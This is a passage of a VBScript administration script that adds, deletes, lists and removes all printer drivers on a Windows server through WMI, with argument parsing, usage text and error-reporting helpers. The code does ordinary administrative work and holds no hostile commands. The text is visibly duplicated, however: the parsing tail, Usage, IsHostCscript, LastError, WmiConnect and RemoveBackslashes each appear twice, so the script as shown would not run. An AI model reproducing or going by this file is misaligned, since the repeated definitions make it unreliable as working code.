    iAction = kActionUnknown
    iIndex = 0

    set oArgs = wscript.Arguments

    while iIndex < oArgs.Count

        select case oArgs(iIndex)

            case "-a"
                iAction = kActionAdd

            case "-d"
                iAction = kActionDel

            case "-l"
                iAction = kActionList

            case "-x"
                iAction = kActionDelAll

            case "-s"
                iIndex = iIndex + 1
                strServer = RemoveBackslashes(oArgs(iIndex))

            case "-m"
                iIndex = iIndex + 1
                strModel = oArgs(iIndex)

            case "-h"
                iIndex = iIndex + 1
                strPath = oArgs(iIndex)

            case "-v"
                iIndex = iIndex + 1
                uVersion = oArgs(iIndex)

            case "-e"
                iIndex = iIndex + 1
                strEnvironment = oArgs(iIndex)

            case "-i"
                iIndex = iIndex + 1
                strInfFile = oArgs(iIndex)

            case "-u"
                iIndex = iIndex + 1
                strUser = oArgs(iIndex)

            case "-w"
                iIndex = iIndex + 1
                strPassword = oArgs(iIndex)

            case "-?"
                Usage(true)
                exit function

            case else
                Usage(true)
                exit function

        end select

        iIndex = iIndex + 1

    wend

    if Err.Number <> 0 then

        wscript.echo L_Text_Error_General02_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_text & Err.Description

        ParseCommandLine = kErrorFailure

    else

        ParseCommandLine = kErrorSuccess

    end if

end  function

'
' Display command usage.
'
sub Usage(bExit)

    wscript.echo L_Help_Help_General01_Text
    wscript.echo L_Help_Help_General02_Text
    wscript.echo L_Help_Help_General03_Text
    wscript.echo L_Help_Help_General04_Text
    wscript.echo L_Help_Help_General05_Text
    wscript.echo L_Help_Help_General06_Text
    wscript.echo L_Help_Help_General07_Text
    wscript.echo L_Help_Help_General08_Text
    wscript.echo L_Help_Help_General09_Text
    wscript.echo L_Help_Help_General10_Text
    wscript.echo L_Help_Help_General11_Text
    wscript.echo L_Help_Help_General12_Text
    wscript.echo L_Help_Help_General13_Text
    wscript.echo L_Help_Help_General14_Text
    wscript.echo L_Help_Help_General15_Text
    wscript.echo L_Help_Help_General16_Text
    wscript.echo L_Empty_Text
    wscript.echo L_Help_Help_General17_Text
    wscript.echo L_Help_Help_General18_Text
    wscript.echo L_Help_Help_General19_Text
    wscript.echo L_Help_Help_General20_Text
    wscript.echo L_Help_Help_General21_Text
    wscript.echo L_Help_Help_General22_Text
    wscript.echo L_Help_Help_General23_Text
    wscript.echo L_Help_Help_General24_Text
    wscript.echo L_Help_Help_General25_Text
    wscript.echo L_Help_Help_General26_Text
    wscript.echo L_Empty_Text
    wscript.echo L_Help_Help_General27_Text
    wscript.echo L_Help_Help_General28_Text
    wscript.echo L_Help_Help_General29_Text
    wscript.echo L_Help_Help_General30_Text
    wscript.echo L_Help_Help_General31_Text

    if bExit then

        wscript.quit(1)

    end if

end sub

'
' Determines which program is being used to run this script.
' Returns true if the script host is cscript.exe
'
function IsHostCscript()

    on error resume next

    dim strFullName
    dim strCommand
    dim i, j
    dim bReturn

    bReturn = false

    strFullName = WScript.FullName

    i = InStr(1, strFullName, ".exe", 1)

    if i <> 0 then

        j = InStrRev(strFullName, "\", i, 1)

        if j <> 0 then

            strCommand = Mid(strFullName, j+1, i-j-1)

            if LCase(strCommand) = "cscript" then

                bReturn = true

            end if

        end if

    end if

    if Err <> 0 then

        wscript.echo L_Text_Error_General01_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

    end if

    IsHostCscript = bReturn

end function

'
' Retrieves extended information about the last error that occurred
' during a WBEM operation. The methods that set an SWbemLastError
' object are GetObject, PutInstance, DeleteInstance
'
sub LastError()

    on error resume next

    dim oError

    set oError = CreateObject("WbemScripting.SWbemLastError")

    if Err = kErrorSuccess then

        wscript.echo L_Operation_Text            & L_Space_Text & oError.Operation
        wscript.echo L_Provider_Text             & L_Space_Text & oError.ProviderName
        wscript.echo L_Description_Text          & L_Space_Text & oError.Description
        wscript.echo L_Text_Error_General03_Text & L_Space_Text & oError.StatusCode

    end if

end sub

'
' Connects to the WMI service on a server. oService is returned as a service
' object (SWbemServices)
'
function WmiConnect(strServer, strNameSpace, strUser, strPassword, oService)

    on error resume next

    dim oLocator
    dim bResult

    oService = null

    bResult  = false

    set oLocator = CreateObject("WbemScripting.SWbemLocator")

    if Err = kErrorSuccess then

        set oService = oLocator.ConnectServer(strServer, strNameSpace, strUser, strPassword)

        if Err = kErrorSuccess then

            bResult = true

            oService.Security_.impersonationlevel = 3

            '
            ' Required to perform administrative tasks on the spooler service
            '
            oService.Security_.Privileges.AddAsString "SeLoadDriverPrivilege"

            Err.Clear

        else

            wscript.echo L_Text_Msg_General11_Text & L_Space_Text & L_Error_Text _
                         & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                         & Err.Description

        end if

    else

        wscript.echo L_Text_Msg_General10_Text & L_Space_Text & L_Error_Text _
                     & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                     & Err.Description

    end if

    WmiConnect = bResult

end function

'
' Remove leading "\\" from server name
'
function RemoveBackslashes(strServer)

    dim strRet

    strRet = strServer

    if Left(strServer, 2) = "\\" and Len(strServer) > 2 then

        strRet = Mid(strServer, 3)

    end if

    RemoveBackslashes = strRet

end function
function AddDriver(strServer, strModel, strFilePath, uVersion, strEnvironment, strInfFile, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg01_Text

    dim oDriver
    dim oService
    dim iResult
    dim uResult

    '
    ' Initialize return value
    '
    iResult = kErrorFailure

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set oDriver = oService.Get("Win32_PrinterDriver")

    else

        AddDriver = kErrorFailure

        exit function

    end if

    '
    ' Check if Get was successful
    '
    if Err.Number = kErrorSuccess then

        oDriver.Name              = strModel
        oDriver.SupportedPlatform = strEnvironment
        oDriver.Version           = uVersion
        oDriver.FilePath          = strFilePath
        oDriver.InfName           = strInfFile

        uResult = oDriver.AddPrinterDriver(oDriver)

        if Err.Number = kErrorSuccess then

            if uResult = kErrorSuccess then

                wscript.echo L_Text_Msg_General01_Text & L_Space_Text & oDriver.Name

                iResult = kErrorSuccess

            else

                wscript.echo L_Text_Msg_General02_Text & L_Space_Text & strModel & L_Space_Text _
                             & L_Text_Error_General03_Text & L_Space_Text & uResult

            end if

        else

            wscript.echo L_Text_Msg_General02_Text & L_Space_Text & strModel & L_Space_Text _
                         & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

        end if

    else

        wscript.echo L_Text_Msg_General02_Text & L_Space_Text & strModel & L_Space_Text _
                     & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

    end if

    AddDriver = iResult

end function

'
' Delete a driver
'
function DelDriver(strServer, strModel, uVersion, strEnvironment, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg02_Text

    dim oDriver
    dim oService
    dim iResult
    dim strObject

    '
    ' Initialize return value
    '
    iResult = kErrorFailure

    '
    ' Build the key that identifies the driver instance.
    '
    strObject = strModel & "," & CStr(uVersion) & "," & strEnvironment

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set oDriver = oService.Get("Win32_PrinterDriver.Name='" & strObject & "'")

    else

        DelDriver = kErrorFailure

        exit function

    end if

    '
    ' Check if Get was successful
    '
    if Err.Number = kErrorSuccess then

        '
        ' Delete the printer driver instance
        '
        oDriver.Delete_

        if Err.Number = kErrorSuccess then

            wscript.echo L_Text_Msg_General04_Text & L_Space_Text & oDriver.Name

            iResult = kErrorSuccess

        else

            wscript.echo L_Text_Msg_General03_Text & L_Space_Text & strModel & L_Space_Text _
                         & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
                         & L_Space_Text & Err.Description

            call LastError()

        end if

    else

        wscript.echo L_Text_Msg_General03_Text & L_Space_Text & strModel & L_Space_Text _
                     & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
                     & L_Space_Text & Err.Description

    end if

    DelDriver = iResult

end function

'
' Delete all drivers
'
function DelAllDrivers(strServer, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg03_Text

    dim Drivers
    dim oDriver
    dim oService
    dim iResult
    dim iTotal
    dim iTotalDeleted
    dim vntDependentFiles
    dim strDriverName

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set Drivers = oService.InstancesOf("Win32_PrinterDriver")

    else

        DelAllDrivers = kErrorFailure

        exit function

    end if

    if Err.Number <> kErrorSuccess then

        wscript.echo L_Text_Msg_General05_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

        DelAllDrivers = kErrorFailure

        exit function

    end if

    iTotal = 0
    iTotalDeleted = 0

    for each oDriver in Drivers

        iTotal = iTotal + 1

        wscript.echo
        wscript.echo L_Text_Msg_General08_Text
        wscript.echo L_Text_Msg_Driver01_Text & L_Space_Text & strServer
        wscript.echo L_Text_Msg_Driver02_Text & L_Space_Text & oDriver.Name
        wscript.echo L_Text_Msg_Driver03_Text & L_Space_Text & oDriver.Version
        wscript.echo L_Text_Msg_Driver04_Text & L_Space_Text & oDriver.SupportedPlatform

        strDriverName = oDriver.Name

        '
        ' Example of how to delete an instance of a printer driver
        '
        oDriver.Delete_

        if Err.Number = kErrorSuccess then

            wscript.echo L_Text_Msg_General04_Text & L_Space_Text & oDriver.Name

            iTotalDeleted = iTotalDeleted + 1

        else

            '
            ' We cannot use oDriver.Name to display the driver name, because the SWbemLastError
            ' that the function LastError() looks at would be overwritten. For that reason we
            ' use strDriverName for accessing the driver name
            '
            wscript.echo L_Text_Msg_General03_Text & L_Space_Text & strDriverName & L_Space_Text _
                         & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
                         & L_Space_Text & Err.Description

            '
            ' Try getting extended error information
            '
            call LastError()

            Err.Clear

        end if

    next

    wscript.echo L_Empty_Text
    wscript.echo L_Text_Msg_General06_Text & L_Space_Text & iTotal
    wscript.echo L_Text_Msg_General07_Text & L_Space_Text & iTotalDeleted

    DelAllDrivers = kErrorSuccess

end function

'
' List drivers
'
function ListDrivers(strServer, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg04_Text

    dim Drivers
    dim oDriver
    dim oService
    dim iResult
    dim iTotal
    dim vntDependentFiles

    if WmiConnect(strServer, kNameSpace, strUser, strPassword, oService) then

        set Drivers = oService.InstancesOf("Win32_PrinterDriver")

    else

        ListDrivers = kErrorFailure

        exit function

    end if

    if Err.Number <> kErrorSuccess then

        wscript.echo L_Text_Msg_General05_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

        ListDrivers = kErrorFailure

        exit function

    end if

    iTotal = 0

    for each oDriver in Drivers

        iTotal = iTotal + 1

        wscript.echo
        wscript.echo L_Text_Msg_Driver01_Text & L_Space_Text & strServer
        wscript.echo L_Text_Msg_Driver02_Text & L_Space_Text & oDriver.Name
        wscript.echo L_Text_Msg_Driver03_Text & L_Space_Text & oDriver.Version
        wscript.echo L_Text_Msg_Driver04_Text & L_Space_Text & oDriver.SupportedPlatform
        wscript.echo L_Text_Msg_Driver05_Text & L_Space_Text & oDriver.MonitorName
        wscript.echo L_Text_Msg_Driver06_Text & L_Space_Text & oDriver.DriverPath
        wscript.echo L_Text_Msg_Driver07_Text & L_Space_Text & oDriver.DataFile
        wscript.echo L_Text_Msg_Driver08_Text & L_Space_Text & oDriver.ConfigFile
        wscript.echo L_Text_Msg_Driver09_Text & L_Space_Text & oDriver.HelpFile

        vntDependentFiles = oDriver.DependentFiles

        '
        ' If there are no dependent files, the method will set DependentFiles to
        ' an empty variant, so we check if the variant is an array of variants
        '
        if VarType(vntDependentFiles) = (vbArray + vbVariant) then

            PrintDepFiles oDriver.DependentFiles

        end if

        Err.Clear

    next

    wscript.echo L_Empty_Text
    wscript.echo L_Text_Msg_General06_Text & L_Space_Text & iTotal

    ListDrivers = kErrorSuccess

end function

'
' Prints the contents of an array of variants
'
sub PrintDepFiles(Param)

   on error resume next

   dim iIndex

   iIndex = LBound(Param)

   if Err.Number = 0 then

      wscript.echo L_Text_Msg_Driver10_Text

      for iIndex = LBound(Param) to UBound(Param)

          wscript.echo L_Space_Text & Param(iIndex)

      next

   else

        wscript.echo L_Text_Msg_General09_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

   end if

end sub

'
' Debug display helper function
'
sub DebugPrint(uFlags, strString)

    if gDebugFlag = true then

        if uFlags = kDebugTrace then

            wscript.echo L_Debug_Text & L_Space_Text & strString

        end if

        if uFlags = kDebugError then

            if Err <> 0 then

                wscript.echo L_Debug_Text & L_Space_Text & strString & L_Space_Text _
                             & L_Error_Text & L_Space_Text & L_Hex_Text & hex(Err.Number) _
                             & L_Space_Text & Err.Description

            end if

        end if

    end if

end sub

'
' Parse the command line into its components
'
function ParseCommandLine(iAction, strServer, strModel, strPath, uVersion, _
                          strEnvironment, strInfFile, strUser, strPassword)

    on error resume next

    DebugPrint kDebugTrace, L_Text_Dbg_Msg05_Text

    dim oArgs
    dim iIndex

    iAction = kActionUnknown
    iIndex = 0

    set oArgs = wscript.Arguments

    while iIndex < oArgs.Count

        select case oArgs(iIndex)

            case "-a"
                iAction = kActionAdd

            case "-d"
                iAction = kActionDel

            case "-l"
                iAction = kActionList

            case "-x"
                iAction = kActionDelAll

            case "-s"
                iIndex = iIndex + 1
                strServer = RemoveBackslashes(oArgs(iIndex))

            case "-m"
                iIndex = iIndex + 1
                strModel = oArgs(iIndex)

            case "-h"
                iIndex = iIndex + 1
                strPath = oArgs(iIndex)

            case "-v"
                iIndex = iIndex + 1
                uVersion = oArgs(iIndex)

            case "-e"
                iIndex = iIndex + 1
                strEnvironment = oArgs(iIndex)

            case "-i"
                iIndex = iIndex + 1
                strInfFile = oArgs(iIndex)

            case "-u"
                iIndex = iIndex + 1
                strUser = oArgs(iIndex)

            case "-w"
                iIndex = iIndex + 1
                strPassword = oArgs(iIndex)

            case "-?"
                Usage(true)
                exit function

            case else
                Usage(true)
                exit function

        end select

        iIndex = iIndex + 1

    wend

    if Err.Number <> 0 then

        wscript.echo L_Text_Error_General02_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_text & Err.Description

        ParseCommandLine = kErrorFailure

    else

        ParseCommandLine = kErrorSuccess

    end if

end  function

'
' Display command usage.
'
sub Usage(bExit)

    wscript.echo L_Help_Help_General01_Text
    wscript.echo L_Help_Help_General02_Text
    wscript.echo L_Help_Help_General03_Text
    wscript.echo L_Help_Help_General04_Text
    wscript.echo L_Help_Help_General05_Text
    wscript.echo L_Help_Help_General06_Text
    wscript.echo L_Help_Help_General07_Text
    wscript.echo L_Help_Help_General08_Text
    wscript.echo L_Help_Help_General09_Text
    wscript.echo L_Help_Help_General10_Text
    wscript.echo L_Help_Help_General11_Text
    wscript.echo L_Help_Help_General12_Text
    wscript.echo L_Help_Help_General13_Text
    wscript.echo L_Help_Help_General14_Text
    wscript.echo L_Help_Help_General15_Text
    wscript.echo L_Help_Help_General16_Text
    wscript.echo L_Empty_Text
    wscript.echo L_Help_Help_General17_Text
    wscript.echo L_Help_Help_General18_Text
    wscript.echo L_Help_Help_General19_Text
    wscript.echo L_Help_Help_General20_Text
    wscript.echo L_Help_Help_General21_Text
    wscript.echo L_Help_Help_General22_Text
    wscript.echo L_Help_Help_General23_Text
    wscript.echo L_Help_Help_General24_Text
    wscript.echo L_Help_Help_General25_Text
    wscript.echo L_Help_Help_General26_Text
    wscript.echo L_Empty_Text
    wscript.echo L_Help_Help_General27_Text
    wscript.echo L_Help_Help_General28_Text
    wscript.echo L_Help_Help_General29_Text
    wscript.echo L_Help_Help_General30_Text
    wscript.echo L_Help_Help_General31_Text

    if bExit then

        wscript.quit(1)

    end if

end sub

'
' Determines which program is being used to run this script.
' Returns true if the script host is cscript.exe
'
function IsHostCscript()

    on error resume next

    dim strFullName
    dim strCommand
    dim i, j
    dim bReturn

    bReturn = false

    strFullName = WScript.FullName

    i = InStr(1, strFullName, ".exe", 1)

    if i <> 0 then

        j = InStrRev(strFullName, "\", i, 1)

        if j <> 0 then

            strCommand = Mid(strFullName, j+1, i-j-1)

            if LCase(strCommand) = "cscript" then

                bReturn = true

            end if

        end if

    end if

    if Err <> 0 then

        wscript.echo L_Text_Error_General01_Text & L_Space_Text & L_Error_Text & L_Space_Text _
                     & L_Hex_Text & hex(Err.Number) & L_Space_Text & Err.Description

    end if

    IsHostCscript = bReturn

end function

'
' Retrieves extended information about the last error that occurred
' during a WBEM operation. The methods that set an SWbemLastError
' object are GetObject, PutInstance, DeleteInstance
'
sub LastError()

    on error resume next

    dim oError

    set oError = CreateObject("WbemScripting.SWbemLastError")

    if Err = kErrorSuccess then

        wscript.echo L_Operation_Text            & L_Space_Text & oError.Operation
        wscript.echo L_Provider_Text             & L_Space_Text & oError.ProviderName
        wscript.echo L_Description_Text          & L_Space_Text & oError.Description
        wscript.echo L_Text_Error_General03_Text & L_Space_Text & oError.StatusCode

    end if

end sub

'
' Connects to the WMI service on a server. oService is returned as a service
' object (SWbemServices)
'
function WmiConnect(strServer, strNameSpace, strUser, strPassword, oService)

    on error resume next

    dim oLocator
    dim bResult

    oService = null

    bResult  = false

    set oLocator = CreateObject("WbemScripting.SWbemLocator")

    if Err = kErrorSuccess then

        set oService = oLocator.ConnectServer(strServer, strNameSpace, strUser, strPassword)

        if Err = kErrorSuccess then

            bResult = true

            oService.Security_.impersonationlevel = 3

            '
            ' Required to perform administrative tasks on the spooler service
            '
            oService.Security_.Privileges.AddAsString "SeLoadDriverPrivilege"

            Err.Clear

        else

            wscript.echo L_Text_Msg_General11_Text & L_Space_Text & L_Error_Text _
                         & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                         & Err.Description

        end if

    else

        wscript.echo L_Text_Msg_General10_Text & L_Space_Text & L_Error_Text _
                     & L_Space_Text & L_Hex_Text & hex(Err.Number) & L_Space_Text _
                     & Err.Description

    end if

    WmiConnect = bResult

end function

'
' Remove leading "\\" from server name
'
function RemoveBackslashes(strServer)

    dim strRet

    strRet = strServer

    if Left(strServer, 2) = "\\" and Len(strServer) > 2 then

        strRet = Mid(strServer, 3)

    end if

    RemoveBackslashes = strRet
end function